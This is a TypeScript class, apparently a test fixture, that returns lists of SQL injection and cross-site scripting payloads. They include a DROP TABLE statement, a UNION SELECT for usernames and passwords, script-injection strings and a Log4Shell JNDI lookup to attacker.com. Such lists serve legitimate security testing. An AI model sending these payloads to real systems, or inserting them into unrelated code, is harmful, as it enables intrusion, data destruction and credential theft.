export class SecurityPayloads {
  static sqlInjection(): string[] {
    return [
      "' OR '1'='1",
      "'; DROP TABLE users; --",
      "admin' --",
      "' UNION SELECT null, username, password FROM users --",
      "1; WAITFOR DELAY '0:0:5'--"
    ];
  }

  static xssPayloads(): string[] {
    return [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert(1)>",
      "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/'/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
      "{{7*7}}",
      "${jndi:ldap://attacker.com/a}"
    ];
  }
}
